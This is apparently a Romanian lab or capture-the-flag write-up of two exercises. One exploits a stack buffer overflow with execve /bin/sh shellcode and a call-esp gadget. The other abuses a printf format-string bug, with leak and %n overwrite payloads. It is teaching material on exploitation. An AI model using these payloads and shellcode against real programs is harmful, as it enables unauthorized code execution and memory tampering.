# 1 - Folosirea Apelului de Sistem `execve` în *Shellcode* 💁

Analizând într-un dezasamblor (eventual și decompilator), deducem faptul că programul ia ca argumente două valori: numele unui fișier, al cărui conținut îl citește într-un *buffer*, și numărul de paragrafe pe care textul trebuie să îl atingă sau depășească. Din cauza lungimii fixe a *buffer*-ului, programul este vulnerabil la o suprascriere a acestuia.

Putem genera un fișier cu o lungime care să o depășească pe cea a *buffer*-ului (1100 de caractere sunt suficiente) din interpretorul în linie de comandă a Python 3.

```
from pwnlib.util.cyclic import *
generator = cyclic_gen()
garbage_payload = generator.get(1100)
open("payload.bin", "wb").write(garbage_payload)
```

Dând numele fișierul generat (`payload.bin`) ca argument executabilului, observăm că o eroare este produsă. Din ieșirea comenzii `dmesg`, putem observa că registrul `eip` a fost suprascris cu o valoare care nu poate fi dereferențiată. Luând acea valoare și convertind-o în ASCII (obținând un șir de caractere pe care în notăm cu `EIP_VALUE`), putem afla distanța dintre începutul *buffer*-ului și valoarea ce suprascrie registrul `eip` tot din interpretorul deschis anterior, cu ajutorul comenzii `generator.find(EIP_VALUE)`.

Vizitând *website*-ul menționat în enunț, putem alege un *shellcode* care să lanseze un *shell* (de exemplu, [acesta](http://shell-storm.org/shellcode/files/shellcode-841.php)). Copiind șirul de octeți ce îl reprezintă într-un fișier numit `shellcode.bin`, putem folosi comanda `objdump -b binary -m i386 -D shellcode.bin` pentru a-l dezasambla.

```
shellcode.bin:     file format binary

Disassembly of section .data:

00000000 <.data>:
   0:	31 c9                	xor    ecx,ecx
   2:	f7 e1                	mul    ecx
   4:	b0 0b                	mov    al,0xb
   6:	51                   	push   ecx
   7:	68 2f 2f 73 68       	push   0x68732f2f
   c:	68 2f 62 69 6e       	push   0x6e69622f
  11:	89 e3                	mov    ebx,esp
  13:	cd 80                	int    0x80
  15:	0a                   	.byte 0xa
```

Payload-ul final se va folosi și de simbolul menționat, `helper`. Acesta execută instrucțiunea `call %esp`, ceea ce mută fluxul programului pe stivă, octeții executați fiind cei imediat de sub adresa de retur.

Structura payload-ului este următoarea:

```
+-----------------------+-------------------------------+-----------+
|                       |                               |           |
| 1052 bytes of garbage | 4 bytes for address of helper | shellcode |
|                       |                               |           |
+-----------------------+-------------------------------+-----------+
```

Crearea *payload*-ului și exploatarea efectivă a programului pot fi găsite în *script*-ul [exploit.py](essay-checker/exploit.py)

# 2 - Exploatări ale Șirurilor de Caractere de Formatare 💁

Dezasamblarea și decompilarea programului ne sugerează faptul că programul, în interiorul funcției `print_letter`, apelează funcția `printf` cu un singur argument, acesta fiind controlat de utilizator. Din semnătura funcției, primul argument poate conține și secvențe de caractere pentru formatare, de tipul `%d`, `%x`, `%s` și `%n`.

Exploatarea se poate efectua astfel:
- Întreruperea execuției programului: Este de ajuns să punem o secvență scurtă de `%s` pentru ca programul să încerce să dereferențieze o adresă nemapată corespunzător. Acest lucru va produce închiderea procesului.
- Citirea de informații din memoria procesului: Folosind ca intrare o secvență de `%08x`, putem inspecta tot conținutul stivei procesului.
- Suprascrierea informațiilor în memoria procesului: Suprascrierea se poate efectua prin folosirea `%n`, care scrie la o adresă de memorie numărul de caractere care au fost printate. Astfel, putem scrie în memorie la orice adresă. Pentru moment, să presupunem numai că dorim să suprascriem valoarea salvată la simbolul `gifts_count` (mai multe cadouri de Crăciun pentru atacator 🤷). Cum adresa este salvată în cadrul funcției `main`, trebuie numai să ducem cursorul funcției `printf` până acolo. Un payload funcțional ar fi astfel `14 * "%0100x " + "%n"`.